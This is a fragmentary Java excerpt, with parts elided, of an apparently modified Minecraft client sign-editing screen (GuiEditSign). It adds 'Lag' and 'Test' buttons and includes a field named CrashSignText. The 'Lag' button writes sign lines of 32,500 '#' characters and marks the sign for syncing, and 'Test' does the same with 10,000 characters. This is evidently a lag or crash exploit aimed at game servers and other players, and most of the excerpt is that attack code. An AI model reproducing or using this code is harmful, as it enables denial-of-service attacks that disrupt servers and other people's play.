...
public class GuiEditSign extends GuiScreen {
	...
	public IChatComponent[] CrashSignText = new IChatComponent[] { new ChatComponentText(""),
	...
	public void initGui() {
        ...
        this.buttonList.add(new GuiButton(2, this.width / 2 - 100, this.height / 4 + 120 + 24 + 24, "Lag"));
        this.buttonList.add(new GuiButton(3, this.width / 2 - 100, this.height / 4 + 120 + 24 + 24 + 24, "Test"));
	...
	protected void actionPerformed(GuiButton button) throws IOException {
		if (button.enabled) {
            ...
            if (button.id == 1) {
    			...
    			tileSign.signText[1].setChatStyle(style);
    			tileSign.signText[2].setChatStyle(style);
    			tileSign.signText[3].setChatStyle(style);
            ...
            if (button.id == 2) {
                int i = 0;
                while (i < 2) {
                    this.tileSign.signText[i] = new ChatComponentText(StringUtils.repeat((String)"#", (int)32500));
                    ++i;
                }
                this.tileSign.markDirty();
                this.mc.displayGuiScreen(null);
            ...
            if (button.id == 3) {
            	...
            	this.tileSign.signText[1] = new ChatComponentText(StringUtils.repeat((String)"#", (int)10000));
                 this.mc.displayGuiScreen(null);
